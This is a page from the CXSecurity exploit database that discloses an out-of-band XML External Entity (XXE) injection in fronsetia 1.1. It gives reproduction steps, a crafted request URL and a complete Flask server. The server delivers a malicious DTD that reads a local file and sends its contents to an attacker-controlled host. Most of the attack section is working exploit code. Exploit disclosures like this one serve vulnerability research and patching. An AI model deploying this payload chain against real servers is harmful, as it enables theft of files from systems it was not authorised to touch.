---
title: fronsetia 1.1 XML Injection
url: https://cxsecurity.com/issue/WLB-2024110040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-26
fetch_date: 2025-10-06T19:16:59.570511
---

# fronsetia 1.1 XML Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **fronsetia 1.1 XML Injection** **2024.11.25**  Credit:  **[Andrey Stoykov](https://cxsecurity.com/author/Andrey%2BStoykov/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: XXE OOB - fronsetiav1.1
# Date: 11/2024
# Exploit Author: Andrey Stoykov
# Version: 1.1
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2024/11/friday-fun-pentest-series-15-oob-xxe.html
XXE OOB
Description:
- It was found that the application was vulnerable XXE (XML External Entity
Injection)
Steps to Reproduce:
1. Add Python3 server to serve malicious XXE payload
2. Add a file on the file system to be read via the application XXE payload
echo 123123 > /tmp/123
3. Enter the following URL as input
http://192.168.78.128:8080/fronsetia/show\_operations.jsp?Fronsetia\_WSDL=http://192.168.78.1:10000/testxxeService?wsdl
// Python Server Code
from flask import Flask, Response, request
import logging
app = Flask(\_\_name\_\_)
# Set up logging
logging.basicConfig(level=logging.DEBUG)
@app.route('/testxxeService', defaults={'path': ''})
def catch\_all(path):
app.logger.debug("Serving XXE payload")
xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % dtd SYSTEM "http:// 192.168.78.1:10000/data.dtd"> %dtd;
]>
<data>&send;</data>"""
return Response(xml, mimetype='text/xml', status=200)
@app.route('/data.dtd', defaults={'path': ''})
def hello(path):
app.logger.debug("DTD requested")
xml = """<!ENTITY % file SYSTEM "file:///tmp/123">
<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM '
http://192.168.78.1:8000/?content=%file;'>">
%eval;
%exfil;"""
return Response(xml, mimetype='text/xml', status=200)
if \_\_name\_\_ == "\_\_main\_\_":
app.run(host='0.0.0.0', port=10000)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110040)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top